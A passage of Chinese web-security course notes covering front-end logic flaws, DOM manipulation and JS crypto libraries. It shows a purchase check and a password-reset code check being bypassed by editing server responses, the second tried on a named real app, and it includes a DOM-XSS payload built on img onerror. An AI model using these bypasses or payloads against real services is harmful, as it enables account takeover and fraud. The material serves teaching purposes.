</blockquote>
<p>架构：html js shop.html - shopcheck.php</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// 从 POST 请求中获取购买数量</span></span><br><span class="line"><span class="variable">$num</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">// 假设购物车中已有的金钱数为10000，商品价格为8888</span></span><br><span class="line"><span class="comment">// 真实情况下，应该在数据库中获取用户的金钱数等信息</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 初始化一个关联数组变量，通过使用 &#x27;msg&#x27; 作为键，将 &#x27;ok&#x27; 作为值存储在其中。</span></span><br><span class="line"><span class="variable">$success</span> = <span class="keyword">array</span>(<span class="string">&#x27;msg&#x27;</span> =&gt; <span class="string">&#x27;ok&#x27;</span>);</span><br><span class="line"></span><br><span class="line">**<span class="comment">// 检查购买是否合法（金钱是否足够支付）</span></span><br><span class="line"><span class="keyword">if</span> (<span class="number">10000</span> &gt;= (<span class="variable">$num</span> * <span class="number">8888</span>)) &#123;</span><br><span class="line">    <span class="comment">// 如果购买合法，设置信息代码为1表示购买成功</span></span><br><span class="line">    <span class="variable">$success</span>[<span class="string">&#x27;infoCode&#x27;</span>] = <span class="number">1</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="comment">// 如果购买不合法，设置信息代码为0表示购买失败</span></span><br><span class="line">    <span class="variable">$success</span>[<span class="string">&#x27;infoCode&#x27;</span>] = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 将结果以 JSON 格式输出</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">json_encode</span>(<span class="variable">$success</span>);**</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>如果购买量大于持有金额，就会提示失败</p>
<p><img src="/img/xiaodi/c5ab6f0b5e07417259b9d718611cd459.png" alt="Untitled"></p>
<p>安全性：将抓到的包，设置其返回包也抓取，并将访问失败返回包的改为1发送，后购买成功。</p>
<p>当成功后的操作如购买成功后的逻辑到其他页面<strong>写在js中，不安全</strong></p>
<p><img src="https://i-blog.csdnimg.cn/blog_migrate/41b734f0fa2224e265899333aab0e33e.png" alt="Untitled"></p>
<p><img src="https://i-blog.csdnimg.cn/blog_migrate/6910a5d3c0e2572345f24ff08115d0c6.png" alt="Untitled"></p>
<p><img src="https://i-blog.csdnimg.cn/blog_migrate/81f7d695fb313ab91633bab1cbbb0da1.png" alt="Untitled"></p>
<h4 id="实例测试-某违规APP-密码找回-JS验证逻辑安全"><a href="#实例测试-某违规APP-密码找回-JS验证逻辑安全" class="headerlink" title="实例测试-某违规APP-密码找回&amp;JS验证逻辑安全"></a>实例测试-某违规APP-密码找回&amp;JS验证逻辑安全</h4><p>1.使用福利期货为实验对象，先开启抓包获取到正确的验证嘛回显结果</p>
<p><img src="https://i-blog.csdnimg.cn/blog_migrate/67f5670687334a9276228222eb07ed3e.png" alt="Untitled"><img src="https://i-blog.csdnimg.cn/blog_migrate/2c44149941055b5d7706f36fc93b6de1.png" alt="Untitled"></p>
<p><img src="https://i-blog.csdnimg.cn/blog_migrate/58d35f9001566ea383f60d842bbc8daa.png" alt="Untitled"></p>
<p>2.再次点击忘记密码，验证码可以乱输，将返回的错误验证码回显数据，修改为刚刚记录的正确值→验证成功，成功进入修改密码页面</p>
<p><img src="/img/xiaodi/d216847fe47b7b861bb9d0635bd05948.png" alt="Untitled"></p>
<p><img src="/img/xiaodi/725ede206d432b30b3a76869bed31db8.png" alt="Untitled"></p>
<p><img src="/img/xiaodi/7358bbd546615f86c244e9d1066ff63c.png" alt="Untitled"></p>
<p><img src="/img/xiaodi/39821382bd94922b60d9cb6fdf6acea8.png" alt="Untitled"></p>
<h2 id="第二天-1"><a href="#第二天-1" class="headerlink" title="第二天"></a>第二天</h2><p>JS应用&amp;DOM树&amp;加密编码库&amp;断点调试&amp;逆向分析&amp;元素属性操作</p>
<h3 id="JS技术-DOM树操作及安全隐患"><a href="#JS技术-DOM树操作及安全隐患" class="headerlink" title="JS技术-DOM树操作及安全隐患"></a><strong>JS技术-DOM树操作及安全隐患</strong></h3><p>DOM：文档操作对象</p>
<p>浏览器提供的一套专门<strong>用来操作网页代码内容</strong>的功能，实现<strong>自主或用户交互动作反馈</strong></p>
<blockquote>
<p>在Web开发中，浏览器将HTML文档解析为DOM树的结构。DOM树由节点（Nodes）组成，节点可以是元素节点、文本节点、注释节点等。每个节点都有与之相关联的属性、方法和事件。<br>通过使用DOM，您可以通过JavaScript或其他支持DOM的编程语言来访问和操作HTML文档的内容、结构和样式。您可以使用DOM提供的方法和属性来选择元素、修改元素的属性和内容、添加或删除元素，以及响应用户交互等。</p>
</blockquote>
<p><strong>1、获取对象</strong></p>
<blockquote>
<p>标签：直接写<br>Class：加上符号.<br>id：加上符号#</p>
</blockquote>
<p>具体来说，<code>document</code> 是代表整个文档的对象，而 <code>querySelector()</code> 是在文档中查找与指定选择器匹配的第一个元素的方法。</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- 这是标题 --&gt;</span><br><span class="line">&lt;h1 id=&quot;myHeader&quot; onclick=&quot;getValue()&quot;&gt;这是标题&lt;/h1&gt;</span><br><span class="line"></span><br><span class="line">&lt;!-- 选择第一个 h1 元素 --&gt;</span><br><span class="line">document.querySelector(&#x27;h1&#x27;)</span><br><span class="line"></span><br><span class="line">&lt;!-- 选择所有具有 &#x27;id&#x27; 类的元素 --&gt;</span><br><span class="line">document.querySelector(&#x27;.id&#x27;)</span><br><span class="line"></span><br><span class="line">&lt;!-- 选择具有 &#x27;myHeader&#x27; id 的元素 --&gt;</span><br><span class="line">document.querySelector(&#x27;#myHeader&#x27;)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><strong>2、获取对象属性</strong></p>
<p><code>console.log():</code> 是一个用于在控制台输出信息的方法。它是由浏览器或其他 JavaScript 运行环境提供的调试工具。通过调用 console.log()，您可以在控制台中输出消息、变量的值、调试信息等，以便在开发过程中进行调试和测试。</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">例如：</span><br><span class="line">console.log(&quot;Hello, world!&quot;);</span><br><span class="line">这行代码将在控制台输出字符串 &quot;Hello, world!&quot;。</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p><code>const:</code> 是 JavaScript 中的一个关键字，用于声明一个只读的常量变量。使用 const 声明的变量不能<strong>被重新赋值</strong>。一旦<strong>被赋值后</strong>，它的值<strong>就不能再改变。</strong></p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">例如：</span><br><span class="line">const PI = 3.14159;</span><br><span class="line">这行代码声明了一个常量 PI，其值为 3.14159。由于是常量，PI 的值不能再被修改。</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>总结：console.log() 是一个用于输出信息到控制台的方法，而 const 是一个关键字，用于声明只读的常量变量。它们在功能和用途上是完全不同的。</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- HTML代码 --&gt;</span><br><span class="line">&lt;h1 id=&quot;myHeader&quot; onclick=&quot;getValue()&quot;&gt;这是标题&lt;/h1&gt;</span><br><span class="line"></span><br><span class="line">&lt;!-- JavaScript代码 --&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">  // 选择第一个 h1 元素</span><br><span class="line">  const h1 = document.querySelector(&#x27;h1&#x27;);</span><br><span class="line"></span><br><span class="line">  **// 获取 h1 元素的 id 属性</span><br><span class="line">  const id = h1.id;</span><br><span class="line"></span><br><span class="line">  // 输出 id 到控制台</span><br><span class="line">  console.log(id);**</span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><strong>3、操作元素数据</strong></p>
<p>innerHTML 解析后续代码</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">var element = document.getElementById(&quot;myElement&quot;);</span><br><span class="line">var htmlContent = element.innerHTML; // 获取元素的内容（包括 HTML 标记）</span><br><span class="line">**element.innerHTML = &quot;&lt;b&gt;New Content&lt;/b&gt;&quot;; // 设置元素的内容，并解析 HTML 标记**</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><strong>innerText 不解析后续代码</strong></p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">var element = document.getElementById(&quot;myElement&quot;);</span><br><span class="line">var textContent = element.innerText; // 获取元素的纯文本内容</span><br><span class="line">element.innerText = &quot;New Text Content&quot;; // 设置元素的纯文本内容**</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p><strong>innerHTML 解析后续代码</strong></p>
<p><img src="/img/xiaodi/image-20250517194854911.png" alt="image-20250517194854911"></p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;h1 id=&quot;myHeader&quot; onclick=&quot;update1()&quot;&gt;这是标题&lt;/h1&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">    function update1()&#123;</span><br><span class="line">        const h1=document.querySelector(&#x27;h1&#x27;)</span><br><span class="line">        **h1.innerHTML=&quot;这是小迪&lt;Hr&gt;&quot;**</span><br><span class="line">        console.log(str)</span><br><span class="line">    &#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p><strong>innerText 不解析后续代码</strong></p>
<p><img src="/img/xiaodi/image-20250517194917758.png" alt="image-20250517194917758"></p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;h1 id=&quot;myHeader&quot; onclick=&quot;update1()&quot;&gt;这是标题&lt;/h1&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">    function update1()&#123;</span><br><span class="line">        const h1=document.querySelector(&#x27;h1&#x27;)</span><br><span class="line">        h1.innerText=&quot;这是小迪&lt;Hr&gt;&quot;</span><br><span class="line">        console.log(str)</span><br><span class="line">    &#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p><img src="https://i-blog.csdnimg.cn/blog_migrate/49e10b0a1e80426c96add6c29dfb3597.png" alt="Untitled"></p>
<h4 id="安全问题："><a href="#安全问题：" class="headerlink" title="安全问题："></a>安全问题：</h4><p><strong>本身的前端代码通过DOM技术实现代码的更新修改，但是更新修改如果修改的数据可以由用户来指定，就会造成DOM-XSS攻击</strong></p>
<ul>
<li>网易云翻译：可以使用带外dns，造成数据库ip泄露</li>
</ul>
<p><img src="/img/xiaodi/50e0bf91a954f4c95e1c8683ee65a87d.png" alt="Untitled"></p>
<p><img src="/img/xiaodi/5c2a55416f8b1b4e479bea477e3fdb65.png" alt="Untitled"></p>
<ul>
<li><strong><code>update1</code></strong> 函数通过 <strong><code>innerHTML</code> 插入带有 <code>onerror</code> 事件的 <code>img</code> 元素</strong>，这可能导致 <strong>XSS（跨站脚本攻击）漏洞</strong>。在实际应用中，需要谨慎处理用户提供的内容，以防止安全漏洞。</li>
</ul>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;h1 id=&quot;myHeader&quot; onclick=&quot;update1()&quot;&gt;这是标题&lt;/h1&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">function update1()&#123;</span><br><span class="line">        const h1=document.querySelector(&#x27;h1&#x27;)</span><br><span class="line">        **h1.innerHTML=&#x27;&lt;img src=# οnerrοr=&quot;alert(1)&quot;&gt;&#x27;**</span><br><span class="line">        console.log(str)</span><br><span class="line">    &#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>





<p><img src="https://i-blog.csdnimg.cn/blog_migrate/22caf88594f7a6cad91d0033f2bf50c1.png" alt="Untitled"></p>
<h3 id="JS导入库开发-编码加密-逆向调试"><a href="#JS导入库开发-编码加密-逆向调试" class="headerlink" title="JS导入库开发-编码加密-逆向调试"></a><strong>JS导入库开发-编码加密-逆向调试</strong></h3><h4 id="MD5"><a href="#MD5" class="headerlink" title="MD5"></a>MD5</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- 引入 md5.<span class="property">js</span> 脚本 --&gt;</span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;js/md5.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line"></span><br><span class="line">&lt;!-- <span class="title class_">JavaScript</span> 代码 --&gt;</span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    <span class="comment">// 定义字符串变量</span></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    <span class="keyword">var</span> str1 = <span class="string">&#x27;xiaodi jichu No1&#x27;</span>;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml"></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    <span class="comment">// 使用 md5.js 中的 md5 函数对字符串进行加密</span></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    <span class="keyword">var</span> str_encode = <span class="title function_">md5</span>(str1);</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml"></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    <span class="comment">// 输出加密后的字符串到控制台</span></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    <span class="variable language_">console</span>.<span class="title function_">log</span>(str_encode);</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p>输出：afe5119ec0ab46b55432fc5e24f1dc62</p>
<h4 id="SHA1"><a href="#SHA1" class="headerlink" title="SHA1"></a>SHA1</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- 引入 crypto-js.js 脚本 --&gt;</span><br><span class="line">&lt;script src=&quot;js/crypto-js.js&quot;&gt;&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;!-- JavaScript 代码 --&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">    // 定义字符串变量</span><br><span class="line">    var str1 = &#x27;xiaodisec&#x27;;</span><br><span class="line"></span><br><span class="line">    // 使用 CryptoJS.SHA1 函数对字符串进行 SHA-1 加密，并将结果转为字符串</span><br><span class="line">    var str_encode = CryptoJS.SHA1(str1).toString();</span><br><span class="line"></span><br><span class="line">    // 输出加密后的字符串到控制台</span><br><span class="line">    console.log(str_encode);</span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p>输出：ce22eaa1c5ebd3dfb3f4474b66f6d3612d4cb3ee</p>
<h4 id="HMAC"><a href="#HMAC" class="headerlink" title="HMAC"></a>HMAC</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- 引入 crypto-js.js 脚本 --&gt;</span><br><span class="line">&lt;script src=&quot;js/crypto-js.js&quot;&gt;&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;!-- JavaScript 代码 --&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">    // 定义密钥和字符串变量</span><br><span class="line">    var key = &#x27;key&#x27;;</span><br><span class="line">    var str1 = &#x27;xiaodisec&#x27;;</span><br><span class="line"></span><br><span class="line">    // 使用 CryptoJS.HmacSHA256 函数生成 HMAC-SHA256 散列</span><br><span class="line">    var hash = CryptoJS.HmacSHA256(key, str1);</span><br><span class="line"></span><br><span class="line">    // 将散列结果转为十六进制字符串</span><br><span class="line">    var str_encode = CryptoJS.enc.Hex.stringify(hash);</span><br><span class="line"></span><br><span class="line">    // 输出加密后的字符串到控制台</span><br><span class="line">    console.log(str_encode);</span><br><span class="line">    // 输出示例：&#x27;11a7960cd583ee2c3f1ed910dbc3b6c3991207cbc527d122f69e84d13cc5ce5c&#x27;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>输出：08ac6dc8773bd34dcadeffb2b90a8b8f5be9453a9dce7cf09d4da2fcb363d9e7</p>
<h4 id="AES"><a href="#AES" class="headerlink" title="AES"></a>AES</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&lt;script src=<span class="string">&quot;js/crypto-js.js&quot;</span>&gt;&lt;/script&gt;</span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><span class="language-javascript"></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    <span class="keyword">var</span> aseKey = <span class="string">&quot;12345678&quot;</span>     <span class="comment">// 定制秘钥，长度必须为：8/16/32位, 长度不一致也没问题</span></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    <span class="keyword">var</span> message = <span class="string">&quot;xiaodisec&quot;</span>;  <span class="comment">// 需要加密的内容</span></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    <span class="comment">// 加密 DES/AES切换只需要修改 CryptoJS.AES &lt;=&gt; CryptoJS.DES</span></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    <span class="keyword">var</span> encrypt = <span class="title class_">CryptoJS</span>.<span class="property">AES</span>.<span class="title function_">encrypt</span>(message, <span class="title class_">CryptoJS</span>.<span class="property">enc</span>.<span class="property">Utf8</span>.<span class="title function_">parse</span>(aseKey),  <span class="comment">// 参数1=密钥, 参数2=加密内容</span></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">        &#123;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">            <span class="attr">mode</span>: <span class="title class_">CryptoJS</span>.<span class="property">mode</span>.<span class="property">ECB</span>, <span class="comment">// 为DES的工作方式</span></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">            <span class="attr">padding</span>: <span class="title class_">CryptoJS</span>.<span class="property">pad</span>.<span class="property">Pkcs7</span>  <span class="comment">// 当加密后密文长度达不到指定整数倍(8个字节、16个字节)则填充对应字符</span></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">        &#125;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    ).<span class="title function_">toString</span>(); <span class="comment">// toString=转字符串类型</span></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml"></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    <span class="variable language_">console</span>.<span class="title function_">log</span>(encrypt);</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    <span class="keyword">var</span> decrypt = <span class="title class_">CryptoJS</span>.<span class="property">AES</span>.<span class="title function_">decrypt</span>(encrypt, <span class="title class_">CryptoJS</span>.<span class="property">enc</span>.<span class="property">Utf8</span>.<span class="title function_">parse</span>(aseKey), <span class="comment">// 参数1=密钥, 参数2=解密内容</span></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">        &#123;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">            <span class="attr">mode</span>: <span class="title class_">CryptoJS</span>.<span class="property">mode</span>.<span class="property">ECB</span>,</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">            <span class="attr">padding</span>: <span class="title class_">CryptoJS</span>.<span class="property">pad</span>.<span class="property">Pkcs7</span></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">        &#125;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    ).<span class="title function_">toString</span>(<span class="title class_">CryptoJS</span>.<span class="property">enc</span>.<span class="property">Utf8</span>); <span class="comment">// toString=转字符串类型,并指定编码</span></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    <span class="variable language_">console</span>.<span class="title function_">log</span>(decrypt); <span class="comment">// &quot;xiaodisec&quot;</span></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>输出：g4ohopaiYA34XXLsV92Udw&#x3D;&#x3D; xiaodisec</p>
<h4 id="DES"><a href="#DES" class="headerlink" title="DES"></a>DES</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">&lt;script src=<span class="string">&quot;js/crypto-js.js&quot;</span>&gt;&lt;/script&gt;</span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><span class="language-javascript"></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    <span class="keyword">var</span> aseKey = <span class="string">&quot;12345678&quot;</span>     <span class="comment">// 定制秘钥，长度必须为：8/16/32位， 长度不一致也没问题</span></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    <span class="keyword">var</span> message = <span class="string">&quot;xiaodisec&quot;</span>;  <span class="comment">// 需要加密的内容</span></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    <span class="comment">// 加密 DES/AES切换只需要修改 CryptoJS.AES &lt;=&gt; CryptoJS.DES</span></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    <span class="keyword">var</span> encrypt = <span class="title class_">CryptoJS</span>.<span class="property">DES</span>.<span class="title function_">encrypt</span>(message, <span class="title class_">CryptoJS</span>.<span class="property">enc</span>.<span class="property">Utf8</span>.<span class="title function_">parse</span>(aseKey),  <span class="comment">// 参数1=密钥, 参数2=加密内容</span></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">        &#123;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">            <span class="attr">mode</span>: <span class="title class_">CryptoJS</span>.<span class="property">mode</span>.<span class="property">ECB</span>, <span class="comment">// 为DES的工作方式</span></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">            <span class="attr">padding</span>: <span class="title class_">CryptoJS</span>.<span class="property">pad</span>.<span class="property">Pkcs7</span>  <span class="comment">// 当加密后密文长度达不到指定整数倍(8个字节、16个字节)则填充对应字符</span></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">        &#125;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    ).<span class="title function_">toString</span>(); <span class="comment">// toString=转字符串类型</span></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml"></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    <span class="variable language_">console</span>.<span class="title function_">log</span>(encrypt); <span class="comment">// 控制台打印 CDVNwmEwDRM</span></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml"></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    <span class="comment">//解密</span></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    <span class="keyword">var</span> decrypt = <span class="title class_">CryptoJS</span>.<span class="property">DES</span>.<span class="title function_">decrypt</span>(encrypt, <span class="title class_">CryptoJS</span>.<span class="property">enc</span>.<span class="property">Utf8</span>.<span class="title function_">parse</span>(aseKey), <span class="comment">// 参数1=密钥, 参数2=解密内容</span></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">        &#123;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">            <span class="attr">mode</span>: <span class="title class_">CryptoJS</span>.<span class="property">mode</span>.<span class="property">ECB</span>,</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">            <span class="attr">padding</span>: <span class="title class_">CryptoJS</span>.<span class="property">pad</span>.<span class="property">Pkcs7</span></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">        &#125;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    ).<span class="title function_">toString</span>(<span class="title class_">CryptoJS</span>.<span class="property">enc</span>.<span class="property">Utf8</span>); <span class="comment">// toString=转字符串类型,并指定编码</span></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    <span class="variable language_">console</span>.<span class="title function_">log</span>(decrypt); <span class="comment">// 控制台打印 &quot;i am xiaozhou ?&quot;</span></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml"></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p>输出：WVSwdlodMcV2n1FH72uXgw&#x3D;&#x3D; xiaodisec</p>
